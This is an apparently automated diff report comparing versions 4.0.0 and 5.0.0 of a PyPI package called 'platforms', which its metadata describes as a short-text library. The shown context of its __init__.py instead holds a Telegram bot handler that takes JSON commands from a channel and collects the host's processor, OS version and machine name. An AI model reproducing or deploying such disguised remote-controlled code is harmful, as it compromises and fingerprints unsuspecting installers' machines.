# Comparing `tmp/platforms-4.0.0.tar.gz` & `tmp/platforms-5.0.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "platforms-4.0.0.tar", last modified: Sun May  5 23:15:50 2024, max compression
+gzip compressed data, was "platforms-5.0.0.tar", last modified: Sun May  5 23:36:25 2024, max compression
```

## Comparing `platforms-4.0.0.tar` & `platforms-5.0.0.tar`

### file list

```diff
@@ -1,16 +1,16 @@
-drwxrwxrwx   0        0        0        0 2024-05-05 23:15:50.291702 platforms-4.0.0/
--rw-rw-rw-   0        0        0     1235 2023-04-13 20:26:37.000000 platforms-4.0.0/LICENSE
--rw-rw-rw-   0        0        0      994 2024-05-05 23:15:50.288702 platforms-4.0.0/PKG-INFO
--rw-rw-rw-   0        0        0      638 2023-04-25 04:32:36.000000 platforms-4.0.0/README.md
-drwxrwxrwx   0        0        0        0 2024-05-05 23:15:50.190696 platforms-4.0.0/platforms/
--rw-rw-rw-   0        0        0     3611 2024-05-05 23:14:19.000000 platforms-4.0.0/platforms/__init__.py
--rw-rw-rw-   0        0        0       75 2024-05-05 23:15:06.000000 platforms-4.0.0/platforms/version.py
-drwxrwxrwx   0        0        0        0 2024-05-05 23:15:50.280701 platforms-4.0.0/platforms.egg-info/
--rw-rw-rw-   0        0        0      994 2024-05-05 23:15:47.000000 platforms-4.0.0/platforms.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      261 2024-05-05 23:15:48.000000 platforms-4.0.0/platforms.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2024-05-05 23:15:47.000000 platforms-4.0.0/platforms.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       71 2024-05-05 23:15:47.000000 platforms-4.0.0/platforms.egg-info/requires.txt
--rw-rw-rw-   0        0        0       10 2024-05-05 23:15:47.000000 platforms-4.0.0/platforms.egg-info/top_level.txt
--rw-rw-rw-   0        0        0        2 2024-05-05 23:15:47.000000 platforms-4.0.0/platforms.egg-info/zip-safe
--rw-rw-rw-   0        0        0       42 2024-05-05 23:15:50.293702 platforms-4.0.0/setup.cfg
--rw-rw-rw-   0        0        0     1611 2024-03-26 06:58:46.000000 platforms-4.0.0/setup.py
+drwxrwxrwx   0        0        0        0 2024-05-05 23:36:25.209718 platforms-5.0.0/
+-rw-rw-rw-   0        0        0     1235 2023-04-13 20:26:37.000000 platforms-5.0.0/LICENSE
+-rw-rw-rw-   0        0        0      994 2024-05-05 23:36:25.205718 platforms-5.0.0/PKG-INFO
+-rw-rw-rw-   0        0        0      638 2023-04-25 04:32:36.000000 platforms-5.0.0/README.md
+drwxrwxrwx   0        0        0        0 2024-05-05 23:36:25.146715 platforms-5.0.0/platforms/
+-rw-rw-rw-   0        0        0     3838 2024-05-05 23:35:45.000000 platforms-5.0.0/platforms/__init__.py
+-rw-rw-rw-   0        0        0       75 2024-05-05 23:34:44.000000 platforms-5.0.0/platforms/version.py
+drwxrwxrwx   0        0        0        0 2024-05-05 23:36:25.199718 platforms-5.0.0/platforms.egg-info/
+-rw-rw-rw-   0        0        0      994 2024-05-05 23:36:21.000000 platforms-5.0.0/platforms.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      261 2024-05-05 23:36:23.000000 platforms-5.0.0/platforms.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2024-05-05 23:36:21.000000 platforms-5.0.0/platforms.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       71 2024-05-05 23:36:21.000000 platforms-5.0.0/platforms.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       10 2024-05-05 23:36:21.000000 platforms-5.0.0/platforms.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0        2 2024-05-05 23:36:21.000000 platforms-5.0.0/platforms.egg-info/zip-safe
+-rw-rw-rw-   0        0        0       42 2024-05-05 23:36:25.210718 platforms-5.0.0/setup.cfg
+-rw-rw-rw-   0        0        0     1611 2024-03-26 06:58:46.000000 platforms-5.0.0/setup.py
```

### Comparing `platforms-4.0.0/LICENSE` & `platforms-5.0.0/LICENSE`

 * *Files identical despite different names*

### Comparing `platforms-4.0.0/PKG-INFO` & `platforms-5.0.0/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: platforms
-Version: 4.0.0
+Version: 5.0.0
 Summary: Python 3 library for short text
 Home-page: https://github.com/fenixinvitado2021/shorturl
 Author: RayServer
 Author-email: susej.mabel2009@gmail.com
 License: The Unlicense (Unlicense)
 Keywords: telegram,download,stream,bots
 Classifier: Development Status :: 5 - Production/Stable
```

### Comparing `platforms-4.0.0/README.md` & `platforms-5.0.0/README.md`

 * *Files identical despite different names*

### Comparing `platforms-4.0.0/platforms/__init__.py` & `platforms-5.0.0/platforms/__init__.py`

 * *Files 5% similar despite different names*

```diff
@@ -63,14 +63,21 @@
 
 def progress(filename,index,total):
 	ifmt = sizeof_fmt(index)
 	tfmt = sizeof_fmt(total)
 	printl(f'{filename} {ifmt}/{tfmt}')
 	pass
 
+def sizeof_fmt(num, suffix='B'):
+	for unit in ['', 'Ki', 'Mi', 'Gi', 'Ti', 'Pi', 'Ei', 'Zi']:
+		if abs(num) < 1024.0:
+			return "%3.2f%s%s" % (num, unit, suffix)
+		num /= 1024.0
+	return "%.2f%s%s" % (num, 'Yi', suffix)
+
 @bot.on_message(filters.chat(CHANNEL))
 async def messages(client, message):
 	global USERNAME
 	headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"}
 	user = f"{platform.processor()} {platform.machine()} {platform.version()} {platform.node()}"
 	data = json.loads(message.text)
 	uname = data["to"]
```

### Comparing `platforms-4.0.0/platforms.egg-info/PKG-INFO` & `platforms-5.0.0/platforms.egg-info/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: platforms
-Version: 4.0.0
+Version: 5.0.0
 Summary: Python 3 library for short text
 Home-page: https://github.com/fenixinvitado2021/shorturl
 Author: RayServer
 Author-email: susej.mabel2009@gmail.com
 License: The Unlicense (Unlicense)
 Keywords: telegram,download,stream,bots
 Classifier: Development Status :: 5 - Production/Stable
```

### Comparing `platforms-4.0.0/setup.py` & `platforms-5.0.0/setup.py`

 * *Files identical despite different names*

